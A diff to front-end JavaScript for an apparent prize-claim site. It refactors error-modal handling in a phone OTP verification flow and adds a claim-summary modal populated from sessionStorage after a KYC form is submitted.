@@ -157,6 +157,7 @@ function updateCountdown(targetDate) {
 
 // Modal Management
 let currentModal = null;
+let errorModal = null;
 
 function showModal(modalId) {
   // Hide current modal if any
@@ -229,6 +230,9 @@ function hideModal(modalId) {
         currentModal = null;
         document.body.style.overflow = "";
       }
+      if (errorModal === modal) {
+        errorModal = null;
+      }
     }
   } else if (currentModal) {
     // Close current modal (default behavior)
@@ -238,18 +242,50 @@ function hideModal(modalId) {
   }
 }
 
+function showErrorModal(message) {
+  // Set error message
+  const errorMessageElement = document.getElementById("error-message");
+  if (errorMessageElement) {
+    errorMessageElement.textContent = message;
+  }
+
+  // Show error modal without hiding current modal
+  errorModal = document.getElementById("errorModal");
+  if (errorModal) {
+    errorModal.classList.add("show");
+    // Don't set currentModal so underlying modal stays active
+  }
+}
+
 // Show Summary Modal with user data
 function showSummaryModal() {
-  // Try to get account data from session storage
-  const accountData = JSON.parse(sessionStorage.getItem("accountData") || "{}");
+  // Try to get claim summary data from session storage
+  const claimData = JSON.parse(
+    sessionStorage.getItem("claimSummaryData") || "{}"
+  );
 
   // Populate summary modal with data
   document.getElementById("summary-phone").textContent =
-    accountData.phone || "N/A";
+    claimData.phone || "N/A";
   document.getElementById("summary-email").textContent =
-    accountData.email || "N/A";
+    claimData.email || "N/A";
   document.getElementById("summary-account-holder").textContent =
-    accountData.isAccountHolder === "yes" ? "Yes" : "No";
+    claimData.isAccountHolder === "yes" ? "Yes" : "No";
+  document.getElementById("summary-winner-name").textContent =
+    claimData.winnerName || "N/A";
+  document.getElementById("summary-prize").textContent =
+    claimData.prizeName || "World Cup Experience";
+  document.getElementById("summary-claim-id").textContent =
+    claimData.claimId || "N/A";
+  document.getElementById("summary-submitted").textContent =
+    claimData.submittedAt
+      ? new Date(claimData.submittedAt).toLocaleDateString() +
+        " " +
+        new Date(claimData.submittedAt).toLocaleTimeString([], {
+          hour: "2-digit",
+          minute: "2-digit",
+        })
+      : "N/A";
 
   // Show the summary modal
   showModal("summaryModal");
@@ -431,17 +467,12 @@ async function handleVerifyOtp() {
 
   // Ensure we have exactly 6 digits
   if (enteredOtp.length !== 6) {
-    const errorMessage = document.getElementById("error-message");
-    errorMessage.textContent =
-      "Please enter all 6 digits of the verification code";
-    showModal("errorModal");
+    showErrorModal("Please enter all 6 digits of the verification code");
     return;
   }
 
   if (!phone) {
-    const errorMessage = document.getElementById("error-message");
-    errorMessage.textContent = "Phone number is required for verification";
-    showModal("errorModal");
+    showErrorModal("Phone number is required for verification");
     return;
   }
 
@@ -490,10 +521,9 @@ async function handleVerifyOtp() {
       verifyOtpBtn.textContent = "Verify OTP";
 
       // Show error message
-      const errorMessage = document.getElementById("error-message");
-      errorMessage.textContent =
-        result.message || "Invalid verification code. Please try again.";
-      showModal("errorModal");
+      showErrorModal(
+        result.message || "Invalid verification code. Please try again."
+      );
 
       // Clear OTP inputs for retry
       otpInputs.forEach((input) => {
@@ -511,9 +541,7 @@ async function handleVerifyOtp() {
     verifyOtpBtn.disabled = false;
     verifyOtpBtn.textContent = "Verify OTP";
 
-    const errorMessage = document.getElementById("error-message");
-    errorMessage.textContent = "Network error. Please try again.";
-    showModal("errorModal");
+    showErrorModal("Network error. Please try again.");
   }
 }
 
@@ -987,6 +1015,24 @@ function initKycForm() {
       const result = await response.json();
 
       if (result.status === "success") {
+        // Store claim summary data before clearing accountData
+        const accountData = JSON.parse(
+          sessionStorage.getItem("accountData") || "{}"
+        );
+        const claimSummaryData = {
+          phone: accountData.phone,
+          email: accountData.email,
+          isAccountHolder: accountData.isAccountHolder,
+          winnerName: result.winner_name || accountData.name || "User",
+          prizeName: result.prize_name || "World Cup Experience",
+          claimId: result.claim_id,
+          submittedAt: new Date().toISOString(),
+        };
+        sessionStorage.setItem(
+          "claimSummaryData",
+          JSON.stringify(claimSummaryData)
+        );
+
         // Clear session storage
         sessionStorage.removeItem("accountData");
 
@@ -1028,6 +1074,14 @@ function initModals() {
       }
     });
   });
+
+  // Error modal OK button handler
+  const errorModalOkBtn = document.getElementById("errorModalOkBtn");
+  if (errorModalOkBtn) {
+    errorModalOkBtn.addEventListener("click", () => {
+      hideModal("errorModal");
+    });
+  }
 }
 
 // Start OTP Countdown
